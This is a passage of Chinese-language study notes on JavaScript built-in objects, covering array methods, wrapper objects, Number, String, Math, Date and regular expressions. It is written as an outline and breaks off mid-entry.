push和shift结合使用，就构成了“先进先出”的队列结构（queue）。\r\n\t\t- unshift方法用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。\r\n\r\n\t- join()\r\n\r\n\t\t- join方法以指定参数作为分隔符，将所有数组成员连接为一个字符串返回。如果不提供参数，默认用逗号分隔。\r\n\r\n\t\t- 如果数组成员是undefined或null或空位，会被转成空字符串。\r\n\r\n\t\t- 通过call方法，这个方法也可以用于字符串或类似数组的对象。\r\n\r\n\t- concat()\r\n\r\n\t\t- concat方法用于多个数组的合并。它将新数组的成员，添加到原数组成员的后部，然后返回一个新数组，原数组不变。\r\n\r\n\t\t- 除了数组作为参数，concat也接受其他类型的值作为参数，添加到目标数组尾部。\r\n\r\n\t\t- 如果数组成员包括对象，concat方法返回当前数组的一个浅拷贝。所谓“浅拷贝”，指的是新数组拷贝的是对象的引用。\r\n\r\n\t- reverse()\r\n\r\n\t\t- reverse方法用于颠倒排列数组元素，返回改变后的数组。注意，该方法将改变原数组。\r\n\t- slice()\r\n\r\n\t\t- slice方法用于提取目标数组的一部分，返回一个新数组，原数组不变。\r\n\t\t- 它的第一个参数为起始位置（从0开始），第二个参数为终止位置（但该位置的元素本身不包括在内）。如果省略第二个参数，则一直返回到原数组的最后一个成员。\r\n\r\n\t\t- 如果slice方法的参数是负数，则表示倒数计算的位置。\r\n\r\n\t\t- slice方法的一个重要应用，是将类似数组的对象转为真正的数组。\r\n\r\n\t- splice()\r\n\r\n\t\t- splice方法用于删除原数组的一部分成员，并可以在删除的位置添加新的数组成员，返回值是被删除的元素。注意，该方法会改变原数组。\r\n\t\t- splice的第一个参数是删除的起始位置（从0开始），第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。\r\n\r\n\t\t\t- arr.splice(start, count, addElement1, addElement2, ...);\r\n\t\t- 起始位置如果是负数，就表示从倒数位置开始删除。\r\n\t\t- 如果只是单纯地插入元素，splice方法的第二个参数可以设为0。\r\n\r\n\t\t- 如果只提供第一个参数，等同于将原数组在指定位置拆分成两个数组。\r\n\r\n\t- sort()\r\n\r\n\t\t- sort方法对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。\r\n\t\t- sort方法不是按照大小排序，而是按照字典顺序。也就是说，数值会被先转成字符串，再按照字典顺序进行比较，所以101排在11的前面。\r\n\r\n\t\t- 如果想让sort方法按照自定义方式排序，可以传入一个函数作为参数。\r\n\r\n\t- map()\r\n\r\n\t\t- map方法对数组的所有成员依次调用一个函数，根据函数结果返回一个新数组。\r\n\r\n\t\t- map方法接受一个函数作为参数。该函数调用时，map方法会将其传入三个参数，分别是当前成员、当前位置和数组本身。\r\n\r\n\t\t- map方法不仅可以用于数组，还可以用于字符串，用来遍历字符串的每个字符。但是，不能直接使用，而要通过函数的call方法间接使用，或者先将字符串转为数组，然后使用。\r\n\r\n\t\t- map方法还可以接受第二个参数，表示回调函数执行时this所指向的对象。\r\n\r\n\t\t- 如果数组有空位，map方法的回调函数在这个位置不会执行，不会跳过undefined和null，但是会跳过数组的空位。\r\n\r\n\t- forEach()\r\n\r\n\t\t- forEach方法与map方法很相似，也是遍历数组的所有成员，执行某种操作，但是forEach方法一般不返回值，只用来操作数据。如果需要有返回值，一般使用map方法。\r\n\t\t- forEach方法的参数与map方法一致，也是一个函数，数组的所有成员会依次执行该函数。它接受三个参数，分别是当前位置的值、当前位置的编号和整个数组。\r\n\r\n\t\t- forEach方法也可以接受第二个参数，用来绑定回调函数的this关键字。\r\n\r\n\t\t- 注意，forEach方法无法中断执行，总是会将所有成员遍历完。如果希望符合某种条件时，就中断遍历，要使用for循环。\r\n\t\t- forEach方法不会跳过undefined和null，但会跳过空位。\r\n\t\t- forEach方法也可以用于类似数组的对象和字符串。\r\n\r\n\t- filter()\r\n\r\n\t\t- filter方法的参数是一个函数，所有数组成员依次执行该函数，返回结果为true的成员组成一个新数组返回。该方法不会改变原数组。\r\n\r\n\t\t- filter方法的参数函数可以接受三个参数，第一个参数是当前数组成员的值，这是必需的，后两个参数是可选的，分别是当前数组成员的位置和整个数组。\r\n\r\n\t\t- filter方法还可以接受第二个参数，指定测试函数所在的上下文对象（即this对象）。\r\n\r\n\t- some()，every()\r\n\r\n\t\t- 这两个方法类似“断言”（assert），用来判断数组成员是否符合某种条件。\r\n\t\t- 它们接受一个函数作为参数，所有数组成员依次执行该函数，返回一个布尔值。该函数接受三个参数，依次是当前位置的成员、当前位置的序号和整个数组。\r\n\t\t- some()\r\n\r\n\t\t\t- some方法是只要有一个数组成员的返回值是true，则整个some方法的返回值就是true，否则false。\r\n\r\n\t\t- every()\r\n\r\n\t\t\t- every方法则是所有数组成员的返回值都是true，才返回true，否则false。\r\n\r\n\t\t- 注意，对于空数组，some方法返回false，every方法返回true，回调函数都不会执行。\r\n\t\t- some和every方法还可以接受第二个参数，用来绑定函数中的this关键字。\r\n\r\n\t- reduce()，reduceRight()\r\n\r\n\t\t- 定义\r\n\r\n\t\t\t- reduce方法和reduceRight方法依次处理数组的每个成员，最终累计为一个值。\r\n\r\n\t\t- 差别\r\n\r\n\t\t\t- 它们的差别是，reduce是从左到右处理（从第一个成员到最后一个成员），reduceRight则是从右到左（从最后一个成员到第一个成员），其他完全一样。\r\n\r\n\t\t- 参数\r\n\r\n\t\t\t- 这两个方法的第一个参数都是一个函数。该函数接受以下四个参数。这四个参数之中，只有前两个是必须的，后两个则是可选的。\r\n\r\n\t\t\t\t- 累积变量，默认为数组的第一个成员\r\n\t\t\t\t- 当前变量，默认为数组的第二个成员\r\n\t\t\t\t- 当前位置（从0开始）\r\n\t\t\t\t- 原数组\r\n\r\n\t\t- 示例\r\n\r\n\t\t\t- 求数组成员之和。\r\n\r\n\t\t\t- 利用reduce方法，可以写一个数组求和的sum方法。\r\n\r\n\t\t- 如果要对累积变量指定初值，可以把它放在reduce方法和reduceRight方法的第二个参数。第二个参数相当于设定了默认值，处理空数组时尤其有用。\r\n\r\n\t\t- 由于reduce方法依次处理每个元素，所以实际上还可以用它来搜索某个元素。比如，下面代码是找出长度最长的数组元素。\r\n\r\n\t- indexOf()，lastIndexOf()\r\n\r\n\t\t- indexOf()\r\n\r\n\t\t\t- indexOf方法返回给定元素在数组中第一次出现的位置，如果没有出现则返回-1。\r\n\r\n\t\t\t- indexOf方法还可以接受第二个参数，表示搜索的开始位置。\r\n\r\n\t\t- lastIndexOf()\r\n\r\n\t\t\t- lastIndexOf方法返回给定元素在数组中最后一次出现的位置，如果没有出现则返回-1。\r\n\r\n\t\t- 注意，如果数组中包含NaN，这两个方法不适用，即无法确定数组成员是否包含NaN。\r\n\r\n\t- 链式使用\r\n\r\n\t\t- 上面这些数组方法之中，有不少返回的还是数组，所以可以链式使用。\r\n### 包装对象\r\n\r\n- 包装对象的定义\r\n\r\n\t- 有人说，JavaScript 语言“一切皆对象”。这是因为数组和函数本质上都是对象，就连三种原始类型的值——数值、字符串、布尔值——在一定条件下，也会自动转为对象，也就是原始类型的“包装对象”。\r\n\r\n\t- 所谓“包装对象”，就是分别与数值、字符串、布尔值相对应的Number、String、Boolean三个原生对象。这三个原生对象可以把原始类型的值变成（包装成）对象。\r\n\t- 这三个对象作为构造函数使用（带有new）时，可以将原始类型的值转为对象；作为普通函数使用时（不带有new），可以将任意类型的值，转为原始类型的值。\r\n\r\n- 包装对象实例的方法\r\n\r\n\t- 包装对象实例可以使用Object对象提供的原生方法，主要是valueOf方法和toString方法。\r\n\r\n\t\t- valueOf()\r\n\r\n\t\t- toString()\r\n\r\n- 原始类型的自动转换\r\n\r\n\t- 定义\r\n\r\n\t\t- 原始类型的值，可以自动当作对象调用，即调用各种对象的方法和参数。这时，JavaScript引擎会自动将原始类型的值转为包装对象，在使用后立刻销毁。\r\n\r\n\t\t\t- 上面代码中，abc是一个字符串，本身不是对象，不能调用length属性。JavaScript引擎自动将其转为包装对象，在这个对象上调用length属性。调用结束后，这个临时对象就会被销毁。这就叫原始类型的自动转换。\r\n\r\n\t- 内部属性[[PrimitiveValue]]\r\n\r\n\t\t- 上面代码中，字符串abc的包装对象有每个位置的值、有length属性、还有一个内部属性[[PrimitiveValue]]保存字符串的原始值。这个[[PrimitiveValue]]内部属性，外部是无法调用，仅供ValueOf或toString这样的方法内部调用。\r\n\r\n\t- 这个临时对象是只读的，无法修改。所以，字符串无法添加新属性。\r\n\r\n\t- 另一方面，调用结束后，临时对象会自动销毁。这意味着，下一次调用字符串的属性时，实际是调用一个新生成的对象，而不是上一次调用时生成的那个对象，所以取不到赋值在上一个对象的属性。如果想要为字符串添加属性，只有在它的原型对象String.prototype上定义\r\n\t- 这种原始类型值可以直接调用的方法还有很多（详见后文对各包装对象的介绍），除了前面介绍过的valueOf和toString方法，还包括三个包装对象各自定义在原型上的方法。。\r\n\r\n- 自定义方法\r\n\r\n\t- 三种包装对象还可以在原型上添加自定义方法和属性，供原始类型的值直接调用。\r\n\r\n- 注意\r\n\r\n\t- 注意，false对应的包装对象实例，布尔运算结果也是true。是因为false对应的包装对象实例是一个对象，进行逻辑运算时，被自动转化成布尔值true（因为所有对象对应的布尔值都是true）\r\n\r\n### Number对象\r\n\r\n- 概述\r\n\r\n\t- Number对象是数值对应的包装对象，可以作为构造函数使用，也可以作为工具函数使用。\r\n\t- 作为构造函数时，它用于生成值为数值的对象。\r\n\r\n\t\t- var n = new Number(1);\r\ntypeof n // \"object\"\r\n\r\n\t- 作为工具函数时，它可以将任何类型的值转为数值。\r\n\r\n\t\t- Number(true) // 1\r\n\r\n- Number对象的属性\r\n\r\n\t- Number对象拥有以下一些属性。\r\n\r\n\t\t- Number.POSITIVE_INFINITY：正的无限，指向Infinity。\r\n\t\t- Number.NEGATIVE_INFINITY：负的无限，指向-Infinity。\r\n\t\t- Number.NaN：表示非数值，指向NaN。\r\n\t\t- Number.MAX_VALUE：表示最大的正数，相应的，最小的负数为-Number.MAX_VALUE。\r\n\t\t- Number.MIN_VALUE：表示最小的正数（即最接近0的正数，在64位浮点数体系中为5e-324），相应的，最接近0的负数为-Number.MIN_VALUE。\r\n\t\t- Number.MAX_SAFE_INTEGER：表示能够精确表示的最大整数，即9007199254740991。\r\n\t\t- Number.MIN_SAFE_INTEGER：表示能够精确表示的最小整数，即-9007199254740991。\r\n\r\n- Number 对象实例的方法\r\n\r\n\t- Number.prototype.toString()\r\n\r\n\t\t- 将一个数值转为字符串形式。toString方法可以接受一个参数，表示输出的进制。\r\n\r\n\t- Number.prototype.toFixed()\r\n\r\n\t\t- toFixed方法用于将一个数转为指定位数的小数，返回这个小数对应的字符串。\r\n\r\n\t- Number.prototype.toExponential()\r\n\r\n\t\t- toExponential方法用于将一个数转为科学计数法形式。\r\n\r\n\t- Number.prototype.toPrecision()\r\n\r\n\t\t- toPrecision方法用于将一个数转为指定位数的有效数字。\r\n\r\n- 自定义方法\r\n\r\n\t- 与其他对象一样，Number.prototype对象上面可以自定义方法，被Number的实例继承。\r\n### String对象\r\n\r\n- 概述\r\n\r\n\t- \r\nString对象是JavaScript原生提供的三个包装对象之一，用来生成字符串的包装对象。\r\n\t- 实际上，字符串的包装对象是一个类似数组的对象（即很像数组，但是实质上不是数组）。\r\n\t- 当做构造函数使用\r\n\t- 还可以当作工具方法使用，将任意类型的值转为字符串。\r\n\r\n- 静态方法\r\n\r\n\t- \r\nString.fromCharCode()\r\n\r\n\t\t- 该方法的参数是一系列Unicode码点，返回对应的字符串。\r\n\t\t- 注意，该方法不支持Unicode码点大于0xFFFF的字符，即传入的参数不能大于0xFFFF。\r\n\r\n- 实例对象的属性和方法\r\n\r\n\t- length属性返回字符串的长度。\r\n\r\n\t\t- 'abc'.length // 3\r\n\r\n\t- charAt()\r\n\r\n\t\t- charAt方法返回指定位置的字符，参数是从0开始编号的位置。\r\n\r\n\t\t- 这个方法完全可以用数组下标替代。\r\n\t\t- 如果参数为负数，或大于等于字符串的长度，charAt返回空字符串。\r\n\r\n\t- charCodeAt()\r\n\r\n\t\t- charCodeAt方法返回给定位置字符的Unicode码点（十进制表示），相当于String.fromCharCode()的逆操作。\r\n\r\n\t- concat()\r\n\r\n\t\t- concat方法用于连接两个字符串，返回一个新字符串，不改变原字符串。\r\n\r\n\t\t- 该方法可以接受多个参数。\r\n\r\n\t\t\t- 'a'.concat('b', 'c') // \"abc\"\r\n\r\n\t\t- 如果参数不是字符串，concat方法会将其先转为字符串，然后再连接。\r\n\r\n\t- slice()\r\n\r\n\t\t- slice方法用于从原字符串取出子字符串并返回，不改变原字符串。\r\n\t\t- 它的第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）。\r\n\r\n\t\t\t- 'JavaScript'.slice(0, 4) // \"Java\"\r\n\r\n\t\t- 如果省略第二个参数，则表示子字符串一直到原字符串结束。\r\n\r\n\t\t\t- 'JavaScript'.slice(4) // \"Script\"\r\n\r\n\t\t- 如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度。\r\n\t\t- 如果第一个参数大于第二个参数，slice方法返回一个空字符串。\r\n\r\n\t- substring()\r\n\r\n\t\t- substring方法用于从原字符串取出子字符串并返回，不改变原字符串。它与slice作用相同，但有一些奇怪的规则，因此不建议使用这个方法，优先使用slice。\r\n\t\t- 如果第二个参数大于第一个参数，substring方法会自动更换两个参数的位置。\r\n\t\t- 如果参数是负数，substring方法会自动将负数转为0。\r\n\r\n\t- substr()\r\n\r\n\t\t- substr方法用于从原字符串取出子字符串并返回，不改变原字符串。\r\n\t\t- substr方法的第一个参数是子字符串的开始位置，第二个参数是子字符串的长度。\r\n\t\t- 如果省略第二个参数，则表示子字符串一直到原字符串的结束。\r\n\t\t- 如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。\r\n\r\n\t- indexOf()，lastIndexOf()\r\n\r\n\t\t- 这两个方法用于确定一个字符串在另一个字符串中的位置，都返回一个整数，表示匹配开始的位置。如果返回-1，就表示不匹配。两者的区别在于，indexOf从字符串头部开始匹配，lastIndexOf从尾部开始匹配。\r\n\r\n\t\t- 它们还可以接受第二个参数，对于indexOf方法，第二个参数表示从该位置开始向后匹配；对于lastIndexOf，第二个参数表示从该位置起向前匹配。\r\n\r\n\t- trim()\r\n\r\n\t\t- trim方法用于去除字符串两端的空格，返回一个新字符串，不改变原字符串。该方法去除的不仅是空格，还包括制表符（\\t、\\v）、换行符（\\n）和回车符（\\r）。\r\n\r\n\t\t\t- '\\r\\nabc \\t'.trim() // 'abc'\r\n\r\n\t- toLowerCase()，toUpperCase()\r\n\r\n\t\t- \r\ntoLowerCase方法用于将一个字符串全部转为小写，toUpperCase则是全部转为大写。它们都返回一个新字符串，不改变原字符串。\r\n\t\t- 这个方法也可以将布尔值或数组转为大写字符串，但是需要通过call方法使用。\r\n\r\n\t- localeCompare()\r\n\r\n\t\t- localeCompare方法用于比较两个字符串。它返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串。\r\n\r\n\t- match()\r\n\r\n\t\t- match方法用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回null。\r\n\r\n\t\t- 返回数组还有index属性和input属性，分别表示匹配字符串开始的位置和原始字符串。\r\n\r\n\t\t- match方法还可以使用正则表达式作为参数\r\n\r\n\t- search()\r\n\r\n\t\t- search方法的用法等同于match，但是返回值为匹配的第一个位置。如果没有找到匹配，则返回-1。\r\n\r\n\t\t\t- 'cat, bat, sat, fat'.search('at') // 1\r\n\r\n\t\t- search方法还可以使用正则表达式作为参数\r\n\r\n\t- replace()\r\n\r\n\t\t- replace() 方法用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串。\r\n\t- split()\r\n\r\n\t\t- split方法按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组。\r\n\r\n\t\t\t- 'a|b|c'.split('|') // [\"a\", \"b\", \"c\"]\r\n\r\n\t\t- 如果分割规则为空字符串，则返回数组的成员是原字符串的每一个字符。\r\n\r\n\t\t\t- 'a|b|c'.split('') // [\"a\", \"|\", \"b\", \"|\", \"c\"]\r\n\r\n\t\t- 如果省略参数，则返回数组的唯一成员就是原字符串。\r\n\r\n\t\t- 如果满足分割规则的两个部分紧邻着（即中间没有其他字符），则返回数组之中会有一个空字符串。\r\n\r\n\t\t- split方法还可以接受第二个参数，限定返回数组的最大成员数。\r\n\r\n### Math对象\r\n\r\n- 概述\r\n\r\n\t- Math是JavaScript的内置对象，提供一系列数学常数和数学方法。该对象不是构造函数，不能生成实例，所有的属性和方法都必须在Math对象上调用。\r\n\r\n- 属性\r\n\r\n\t- Math.E：常数e。\r\n\t- Math.LN2：2的自然对数。\r\n\t- Math.LN10：10的自然对数。\r\n\t- Math.LOG2E：以2为底的e的对数。\r\n\t- Math.LOG10E：以10为底的e的对数。\r\n\t- Math.PI：常数Pi。\r\n\t- Math.SQRT1_2：0.5的平方根。\r\n\t- Math.SQRT2：2的平方根。\r\n\r\n- 方法\r\n\r\n\t- Math.abs()：绝对值\r\n\r\n\t\t- Math.abs方法返回参数值的绝对值。\r\n\r\n\t- Math.ceil()：向上取整\r\n\r\n\t\t- Math.ceil方法接受一个参数，返回大于该参数的最小整数。\r\n\r\n\t- Math.floor()：向下取整\r\n\r\n\t\t- Math.floor方法接受一个参数，返回小于该参数的最大整数。\r\n\r\n\t- Math.max()：最大值\r\nMath.min()：最小值\r\n\r\n\t\t- Math.max方法和Math.min方法都可以接受多个参数，Math.max返回其中最大的参数，Math.min返回最小的参数。有趣的是, Math.min 不传参数返回 Infinity, Math.max 不传参数返回 -Infinity。\r\n\r\n\t- Math.pow()：指数运算\r\n\r\n\t\t- Math.pow方法返回以第一个参数为底数、第二个参数为幂的指数值。\r\n\r\n\t- Math.sqrt()：平方根\r\n\r\n\t\t- Math.sqrt方法返回参数值的平方根。如果参数是一个负值，则返回NaN。\r\n\r\n\t- Math.log()：自然对数\r\n\r\n\t\t- Math.log方法返回以e为底的自然对数值。\r\n\r\n\t- Math.exp()：e的指数\r\n\r\n\t\t- Math.exp方法返回常数e的参数次方。\r\n\r\n\t- Math.round()：四舍五入\r\n\r\n\t\t- Math.round方法用于四舍五入。\r\n\t\t- 注意，它对负数的处理（主要是对0.5的处理）。\r\n\r\n\t- Math.random()：随机数\r\n\r\n\t\t- Math.random()返回0到1之间的一个伪随机数，可能等于0，但是一定小于1。\r\n\r\n\t- 三角函数方法\r\n\r\n\t\t- Math.sin()：返回参数的正弦\r\n\t\t- Math.cos()：返回参数的余弦\r\n\t\t- Math.tan()：返回参数的正切\r\n\t\t- Math.asin()：返回参数的反正弦（弧度值）\r\n\t\t- Math.acos()：返回参数的反余弦（弧度值）\r\n\t\t- Math.atan()：返回参数的反正切（弧度值）\r\n\r\n### Date对象\r\n\r\n- 概述\r\n\r\n\t- \r\nDate对象是JavaScript提供的日期和时间的操作接口。它可以表示的时间范围是，1970年1月1日00:00:00前后的各1亿天（单位为毫秒）。\r\n\t- Date对象可以作为普通函数直接调用，无论有没有参数，总是返回一个代表当前时间的字符串。\r\n\r\n- 作为构造函数使用\r\n\r\n\t- 不传参数\r\n\r\n\t\t- 对它使用new命令，会返回一个Date对象的实例。如果不加参数，生成的就是代表当前时间的对象。\r\n\t- 传参数\r\n\r\n\t\t- （1）new Date(milliseconds)\r\n\r\n\t\t\t- Date对象接受从1970年1月1日00:00:00 UTC开始计算的毫秒数作为参数。这意味着如果将Unix时间戳（单位为秒）作为参数，必须将Unix时间戳乘以1000。\r\n\r\n\t\t- （2）new Date(datestring)\r\n\r\n\t\t\t- Date对象还接受一个日期字符串作为参数，返回所对应的时间。所有可以被Date.parse()方法解析的日期字符串，都可以当作Date对象的参数。\r\n\t\t\t- 注意\r\n\r\n\t\t\t\t- 在ES5之中，如果日期采用连词线（-）格式分隔，且具有前导0（即YYYY-MM-DD），JavaScript会认为这是一个ISO格式的日期字符串，导致返回的时间是以UTC时区计算的。\r\n\r\n\t\t- （3）new Date(year, month [, day, hours, minutes, seconds, ms])\r\n\r\n\t\t\t- Date对象还可以接受多个整数作为参数，依次表示年、月、日、小时、分钟、秒和毫秒。如果采用这种格式，最少需要提供两个参数（年和月），其他参数都是可选的，默认等于0。因为如果只使用“年”这一个参数，Date对象会将其解释为毫秒数。\r\n\r\n- 日期的运算\r\n\r\n\t- 类型转换时，Date对象的实例如果转为数值，则等于对应的毫秒数；如果转为字符串，则等于对应的日期字符串。所以，两个日期对象进行减法运算，返回的就是它们间隔的毫秒数；进行加法运算，返回的就是连接后的两个字符串。\r\n\r\n- Date对象的静态方法\r\n\r\n\t- Date.now()\r\n\r\n\t\t- Date.now方法返回当前距离1970年1月1日 00:00:00 UTC的毫秒数（Unix时间戳乘以1000）。\r\n\r\n\t- Date.parse()\r\n\r\n\t\t- Date.parse方法用来解析日期字符串，返回距离1970年1月1日 00:00:00的毫秒数。\r\n\t\t- 其解析的参数最好为YYYY-MM-DDTHH:mm:ss.sssZ格式\r\n\t\t- 如果解析失败，返回NaN。\r\n\r\n\t- Date.UTC()\r\n\r\n\t\t- 默认情况下，Date对象返回的都是当前时区的时间。Date.UTC方法可以返回UTC时间（世界标准时间）。该方法接受年、月、日等变量作为参数，返回当前距离1970年1月1日 00:00:00 UTC的毫秒数。\r\n\r\n- Date实例对象的方法\r\n\r\n\t- to类：从Date对象返回一个字符串，表示指定的时间。\r\n\t- get类：获取Date对象的日期和时间。\r\n\r\n\t- set类：设置Date对象的日期和时间。\r\n\r\n### RegExp对象\r\n\r\n- 概述\r\n\r\n\t- 新建正则表达式有两种方法。一种是使用字面量，以斜杠表示开始和结束。\r\n\r\n\t- 另一种是使用 RegExp 构造函数。\r\n\r\n\t- 它们的主要区别是：第一种方法在编译时新建正则表达式，第二种方法在运行时新建正则表达式。\r\n\t- RegExp 构造函数还可以接受第二个参数，表示修饰符\r\n\r\n\t- 正则对象生成以后，有两种使用方式：\r\n\r\n\t\t- 正则对象的方法：将字符串作为参数，比如regex.test(string)。\r\n\t\t- 字符串对象的方法：将正则对象作为参数，比如string.match(regex)。\r\n\r\n- 正则对象的属性和方法\r\n\r\n\t- 属性\r\n\r\n\t\t- 正则对象的属性分成两类。\r\n\t\t- 一类是修饰符相关，返回一个布尔值，表示对应的修饰符是否设置。\r\n\r\n\t\t\t- ignoreCase：返回一个布尔值，表示是否设置了i修饰符，该属性只读。\r\n\t\t\t- global：返回一个布尔值，表示是否设置了g修饰符，该属性只读。\r\n\t\t\t- multiline：返回一个布尔值，表示是否设置了m修饰符，该属性只读。\r\n\r\n\t\t- 另一类是与修饰符无关的属性，主要是下面两个。\r\n\r\n\t\t\t- lastIndex：返回下一次开始搜索的位置。该属性可读写，但是只在设置了g修饰符时有意义。\r\n\t\t\t- source：返回正则表达式的字符串形式（不包括反斜杠），该属性只读。\r\n\r\n\t- test()\r\n\r\n\t\t- 正则对象的test方法返回一个布尔值，表示当前模式是否能匹配参数字符串。\r\n\r\n\t\t- 如果正则表达式带有g修饰符，则每一次test方法都从上一次结束的位置开始向后匹配。\r\n\r\n\t\t- 如果正则模式是一个空字符串，则匹配所有字符串。\r\n\r\n\t- exec()\r\n\r\n\t\t- 正则对象的exec方法，可以返回匹配结果。如果发现匹配，就返回一个数组，成员是每一个匹配成功的子字符串，否则返回null。\r\n\r\n\t\t- 圆括号，组匹配\r\n\r\n\t\t\t- 如果正则表示式包含圆括号（即含有“组匹配”），则返回的数组会包括多个成员。第一个成员是整个匹配成功的结果，后面的成员就是圆括号对应的匹配成功的组。也就是说，第二个成员对应第一个括号，第三个成员对应第二个括号，以此类推。整个数组的length属性等于组匹配的数量再加1。\r\n\r\n\t\t- exec方法的返回数组还包含以下两个属性：\r\n\r\n\t\t\t- input：整个原字符串。\r\n\t\t\t- index：整个模式匹配成功的开始位置（从0开始计数）\r\n\r\n\t\t- 如果正则表达式加上g修饰符，则可以使用多次exec方法，下一次搜索的位置从上一次匹配成功结束的位置开始。\r\n\r\n\t\t- 利用g修饰符允许多次匹配的特点，可以用一个循环完成全部匹配。\r\n\r\n\t\t- 正则对象的lastIndex属性不仅可读，还可写。一旦手动设置了lastIndex的值，就会从指定位置开始匹配。但是，这只在设置了g修饰符的情况下，才会有效。\r\n\r\n\t\t- 如果正则对象是一个空字符串，则exec方法会匹配成功，但返回的也是空字符串。\r\n\r\n- 字符串对象的方法\r\n\r\n\t- 字符串对象的方法之中，有4种与正则对象有关。\r\n\r\n\t\t- match()：返回一个数组，成员是所有匹配的子字符串。\r\n\t\t- search()：按照给定的正则表达式进行搜索，返回一个整数，表示匹配开始的位置。\r\n\t\t- replace()：按照给定的正则表达式进行替换，返回替换后的字符串。\r\n\t\t- split()：按照给定规则进行字符串分割，返回一个数组，包含分割后的各个成员。\r\n\r\n\t- String.prototype.match()\r\n\r\n\t\t- 字符串对象的match方法对字符串进行正则匹配，返回匹配结果。\r\n\r\n\t\t- 如果正则表达式带有g修饰符，则该方法与正则对象的exec方法行为不同，会一次性返回所有匹配成功的结果。\r\n\r\n\t- String.prototype.search()\r\n\r\n\t\t- 字符串对象的search方法，返回第一个满足条件的匹配结果在整个字符串中的位置。如果没有任何匹配，则返回-1。\r\n\r\n\t\t- 该方法会忽略g修饰符。\r\n\r\n\t- String.prototype.replace()\r\n\r\n\t\t- 字符串对象的replace方法可以替换匹配的值。它接受两个参数，第一个是搜索模式，第二个是替换的内容。\r\n\r\n\t\t\t- str.replace(search, replacement)\r\n\r\n\t\t- 搜索模式如果不加g修饰符，就替换第一个匹配成功的值，否则替换所有匹配成功的值。\r\n\r\n\t\t- replace方法的一个应用，就是消除字符串首尾两端的空格。\r\n\r\n\t\t- 参数\r\n\r\n\t\t\t- replace方法的第二个参数可以使用美元符号$，用来指代所替换的内容。\r\n\r\n\t\t\t\t- $& 指代匹配的子字符串。\r\n\t\t\t\t- $` 指代匹配结果前面的文本。\r\n\t\t\t\t- $' 指代匹配结果后面的文本。\r\n\t\t\t\t- $n 指代匹配成功的第n组内容，n是从1开始的自然数。\r\n\t\t\t\t- $$ 指代美元符号$。\r\n\r\n\t\t\t- replace方法的第二个参数还可以是一个函数，将每一个匹配内容替换为函数返回值。\r\n\r\n\t- String.prototype.split()\r\n\r\n\t\t- 字符串对象的split方法按照正则规则分割字符串，返回一个由分割后的各个部分组成的数组。\r\n\r\n\t\t\t- str.split(separator, [limit])\r\n\r\n\t\t- 该方法接受两个参数，第一个参数是分隔规则，第二个参数是返回数组的最大成员数。\r\n\r\n- 匹配规则\r\n\r\n\t- 字面量字符和元字符\r\n\r\n\t\t- 大部分字符在正则表达式中，就是字面的含义，比如/a/匹配a，/b/匹配b。如果在正则表达式之中，某个字符只表示它字面的含义（就像前面的a和b），那么它们就叫做“字面量字符”\r\n\t\t- 除了字面量字符以外，还有一部分字符有特殊含义，不代表字面的意思。它们叫做“元字符”（metacharacters），主要有以下几个。\r\n\r\n\t\t\t- （1）点字符（.)\r\n\r\n\t\t\t\t- 点字符（.）匹配除回车（\\r）、换行(\\n) 、行分隔符（\\u2028）和段分隔符（\\u2029）以外的所有字符。\r\n\t\t\t- （2）位置字符\r\n\r\n\t\t\t\t- 位置字符用来提示字符所处的位置，主要有两个字符。\r\n\r\n\t\t\t\t\t- ^ 表示字符串的开始位置\r\n\t\t\t\t\t- $ 表示字符串的结束位置\r\n\r\n\t\t\t- （3）选择符（|）\r\n\r\n\t\t\t\t- 竖线符号（|）在正则表达式中表示“或关系”（OR），即cat|dog表示匹配cat或dog。\r\n\r\n\t\t\t\t- 多个选择符可以联合使用。\r\n\t\t\t\t- 选择符会包括它前后的多个字符，比如/ab|cd/指的是匹配ab或者cd，而不是指匹配b或者c。如果想修改这个行为，可以使用圆括号。\r\n\r\n\t\t\t- 其他的元字符还包括\\\\、\\*、+、?、()、[]、{}等，将在下文解释。\r\n\r\n\t- 转义符\r\n\r\n\t\t- 正则表达式中那些有特殊含义的字符，如果要匹配它们本身，就需要在它们前面要加上反斜杠。比如要匹配加号，就要写成\\+。\r\n\t\t- 正则模式中，需要用斜杠转义的，一共有12个字符：^、.、[、$、(、)、|、*、+、?、{和\\\\。需要特别注意的是，如果使用RegExp方法生成正则对象，转义需要使用两个斜杠，因为字符串内部会先转义一次。\r\n\r\n\t- 字符类\r\n\r\n\t\t- 定义\r\n\r\n\t\t\t- 字符类（class）表示有一系列字符可供选择，只要匹配其中一个就可以了。所有可供选择的字符都放在方括号内，比如[xyz] 表示x、y、z之中任选一个匹配。\r\n\r\n\t\t- 有两个字符在字符类中有特殊含义。\r\n\r\n\t\t\t- （1）脱字符（^）\r\n\r\n\t\t\t\t- 如果方括号内的第一个字符是[^]，则表示除了字符类之中的字符，其他字符都可以匹配。比如，[^xyz]表示除了x、y、z之外都可以匹配。\r\n\t\t\t\t- 如果方括号内没有其他字符，即只有[^]，就表示匹配一切字符，其中包括换行符，而点号（.）是不包括换行符的。\r\n\t\t\t\t- 注意，脱字符只有在字符类的第一个位置才有特殊含义，否则就是字面含义。\r\n\r\n\t\t\t- （2）连字符（-）\r\n\r\n\t\t\t\t- 某些情况下，对于连续序列的字符，连字符（-）用来提供简写形式，表示字符的连续范围。比如，[abc]可以写成[a-c]，[0123456789]可以写成[0-9]，同理[A-Z]表示26个大写字母。\r\n\t- 预定义模式\r\n\r\n\t\t- 预定义模式指的是某些常见模式的简写方式。\r\n\r\n\t\t\t- \\d 匹配0-9之间的任一数字，相当于[0-9]。\r\n\t\t\t- \\D 匹配所有0-9以外的字符，相当于[^0-9]。\r\n\t\t\t- \\w 匹配任意的字母、数字和下划线，相当于[A-Za-z0-9_]。\r\n\t\t\t- \\W 